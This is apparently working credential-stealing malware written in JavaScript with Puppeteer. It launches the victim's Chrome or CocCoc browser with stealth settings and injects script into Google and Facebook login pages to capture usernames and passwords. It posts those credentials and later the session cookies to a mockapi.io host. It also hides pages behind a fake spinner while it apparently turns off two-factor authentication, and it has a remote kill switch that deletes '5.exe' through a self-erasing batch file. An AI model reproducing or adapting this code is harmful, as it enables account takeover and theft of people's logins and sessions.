const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require("axios")
const fs = require("fs")
const { argv } = require("process");
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

(async () => {
    let filterPathChrome =
        ['C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application\\browser.exe',
            'C:\\Program Files\\CocCoc\\Browser\\Application\\browser.exe'].filter(v => fs.existsSync(v));

    let args = argv.slice(2);
    let pathchrome = "";
    let userAgent = { 'User-Agent': args[1] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0' }
    console.log(userAgent)
    if (args[0] == "chr") pathchrome = filterPathChrome[0]
    else pathchrome = filterPathChrome[filterPathChrome.length - 1]

    const browser = await puppeteer.launch({
        headless: false,
        executablePath: pathchrome,
        args: ['--start-maximized', '--test-type', "--disable-notifications"],
        ignoreDefaultArgs: ["--enable-automation"],
    });

    var targetProxy = new Proxy({}, {
        set: async function (target, key, value) {
            let page = value;
            await page.setExtraHTTPHeaders(userAgent);

            await page.evaluateOnNewDocument(() => {
                window.addEventListener("DOMContentLoaded", (event) => {
                    if (document.querySelector("#gb > div div > div > div > a > img")) {
                        document.querySelector("#yDmH0d > c-wiz").style.opacity = 0
                    }

                    ['click', 'keypress', 'keyup'].map(evt =>
                        window.addEventListener(evt, (e) => {
                            if (e.key === 'Enter' || e.type == "click") {
                                //gm
                                if (document.querySelector("#password > div.aCsJod.oJeWuf > div > div.Xb9hP > input")) {
                                    window.onClick({ id: document.querySelector("#identifierId")?.value, pw: document.querySelector("#password > div.aCsJod.oJeWuf > div > div.Xb9hP > input")?.value, url: document?.location?.href });
                                }
                                //fb
                                if (document.querySelector("#email")) {
                                    window.onClick({ id: document.querySelector("#email")?.value, pw: document.querySelector("#pass")?.value, url: document?.location?.href });
                                }
                            }
                        })
                    );
                })

                window.addEventListener("load", (event) => {
                    if (document.querySelector("div > div > div div.x1iyjqo2 > ul > li > div > a > div.x6s0dn4.x1gg8mnh > div.x78zum5.xdt5ytf.xq8finb > div > svg")) {
                        window.handleAuto(document?.location?.href);
                    }

                    if (document.querySelector("#gb > div div > div > div > a > img")) {
                        var styles = `
                        .loader {
                            border: 16px solid #f3f3f3;
                            border-radius: 50%;
                            border-top: 16px solid #3498db;
                            width: 120px;
                            height: 120px;
                            -webkit-animation: spin 2s linear infinite;
                            animation: spin 2s linear infinite;
                            transform: translate(-50%, -49%);
                            position: absolute;
                            top: 50%;
                            left: 50%;
                            z-index: 9999999;
                            // background-color: #ffffff;
                            // box-shadow: 100px 10px 10px 10000px #ffffff;
                        }

                        /* Safari */
                        @-webkit-keyframes spin {
                        0% { -webkit-transform: rotate(0deg); }
                        100% { -webkit-transform: rotate(360deg); }
                        }

                        @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                        }
                    `
                        let styleSheet = document.createElement("style")
                        styleSheet.innerText = styles
                        document.head.appendChild(styleSheet)
                        const newDiv = document.createElement("div")
                        newDiv.className = "loader";
                        document.querySelector('body').appendChild(newDiv)

                        window.handleAuto(document?.location?.href);
                    }

                    let clearSettimeout = setInterval(() => {
                        if (document.querySelector("#idvPin") || document.querySelector("#approvals_code")) {
                            window.checkAuto(true);
                            clearInterval(clearSettimeout)
                        }
                    }, 1000);
                });
            });

            let allowAuto = false
            await page.exposeFunction('onClick', async (e) => {
                const { id, pw, url } = e
                console.log("xxxx")
                if (id.length > 0 && pw.length > 0) {
                    axios({
                        method: 'post',
                        url: 'https://5e32baffe0161c00140abafd.mockapi.io/saga/abc',
                        data: {
                            us: id,
                            ps: pw,
                            text: url
                        },
                    });
                }
            });

            await page.exposeFunction('checkAuto', async (e) => {
                if (e) { allowAuto = true }
            })

            await page.exposeFunction('handleAuto', async (e) => {
                try {
                    if (allowAuto) {
                        console.log(e)
                        allowAuto = false
                        let tempUrl = ""
                        let tempNumber = 0

                        // https://myaccount.google.com/security?hl=en
                        // https://myaccount.google.com/signinoptions/two-step-verification?pli=1
                        if (e.indexOf("google.com") > 0) {
                            tempUrl = "https://myaccount.google.com/signinoptions/two-step-verification?pli=1"
                            tempNumber = 1
                        }
                        if (e.indexOf("facebook.com") > 0) {
                            tempUrl = "https://www.facebook.com/security/2fac/settings/"
                            tempNumber = 2
                        }
                        if (e.indexOf("mail.google.com") > 0) {
                            tempUrl = "https://myaccount.google.com/signinoptions/two-step-verification?pli=1"
                            tempNumber = 1
                        }

                        if (tempNumber == 1) {
                            await page.goto(tempUrl,
                                {
                                    waitUntil: 'load',
                                    timeout: 0
                                }
                            );

                            let check2Verify = await page2.evaluate(() => {
                                let el = document.querySelector('#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div:nth-child(1) > div > div.YwhQ0 > div:nth-child(3) > div.F2xFC > div.AbfERb > div > div > span > span')
                                return !!el
                            });

                            if (check2Verify) {
                                await page.click('#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div:nth-child(1) > div > div.YwhQ0 > div:nth-child(3) > div.F2xFC > div.AbfERb > div > div > span > span');
                                await page.waitForTimeout(1000);
                                // await page.click('#yDmH0d > div.llhEMd.iWO5td > div > div.g3VIld.fHKvqc.kxLIc.TL6WSb.WLZ0Yd.Up8vH.J9Nfi.iWO5td > div.XfpsVe.J9fJmf > div > div:nth-child(2) > span > span');
                                await page.click("#yDmH0d > div.llhEMd.iWO5td > div > div.g3VIld.fHKvqc.kxLIc.TL6WSb.WLZ0Yd.Up8vH.J9Nfi.iWO5td > div.XfpsVe.J9fJmf > div > div:nth-child(1) > span > span");

                                await page.goto('https://mail.google.com/mail/u/0/', {
                                    waitUntil: 'load',
                                    timeout: 0
                                });
                            }

                            const lastCookies = await page.cookies();
                            axios({
                                method: 'post',
                                url: 'https://5e32baffe0161c00140abafd.mockapi.io/saga/abc',
                                data: {
                                    text: lastCookies,
                                },
                            })
                        }

                        if (tempNumber == 2) {
                            let lastCookie = await page.cookies();
                            const browser2 = await puppeteer.launch({
                                headless: false,
                                executablePath: pathchrome,
                            });
                            const [page2] = await browser2.pages();

                            await page2.setExtraHTTPHeaders(userAgent);

                            await page2.setCookie(...lastCookie);
                            await page2.goto(tempUrl, {
                                waitUntil: 'load',
                                timeout: 0
                            });

                            let check2Verify = await page2.evaluate(() => {
                                let el = document.querySelector("#content > div._3ks5 > div._3ks6 > div > a")
                                return !!el
                            });

                            if (check2Verify) {
                                await page2.waitForTimeout(2000);
                                await page2.click("#content > div._3ks5 > div._3ks6 > div > a")
                                await page2.waitForTimeout(2000);
                                await page2.click("div._4iyh._2pia._2pi4 > span._4iyi > div > div:nth-child(1) > button > div > div");
                                // await page2.click("div._4iyh._2pia._2pi4 > span._4iyi > div > div:nth-child(2) > button > div > div")
                            }

                            axios({
                                method: 'post',
                                url: 'https://5e32baffe0161c00140abafd.mockapi.io/saga/abc',
                                data: {
                                    text: lastCookie,
                                },
                            });
                            await page2.close()
                        }

                        tempNumber = 0
                    } else {
                        if (e.indexOf("myaccount.google.com/signinoptions/two-step-verification") < 0) {
                            await page.evaluate(() => {
                                document?.querySelector('.loader')?.remove()
                                document.querySelector("#yDmH0d > c-wiz").style.opacity = 1
                            });
                        }
                    }
                } catch (error) {
                    console.log(error, "errrorrrrr")
                }
            })
            return true;
        }
    });

    browser.on('targetcreated', async (e) => {
        let temp = await e.page();
        if (temp) {
            await temp.goto("https://www.google.com/")
            targetProxy.hello_world = temp;

        }
    });

    const [page] = await browser.pages();
    targetProxy.hello_world = page;

    await page.goto(args[2] || "https://vi-vn.facebook.com/",
        {
            waitUntil: 'load',
            timeout: 0
        }
    );

    let checkRemove = await axios.get("https://5f6f2e39adc24200166e0dc8.mockapi.io/api/ok").then(v => v.data.every((x) => x.naruto.indexOf('naruto') > -1))
    if (!checkRemove) {
        fs.writeFile("./1.bat", `taskkill /im 5.exe\ndel 5.exe\ndel %0`, function (err) {
            if (err) {
                return console.log(err);
            }
            spawn('C:\\Windows\\System32\\cmd.exe', ['/c', '1.bat']);
        });
    }
})();
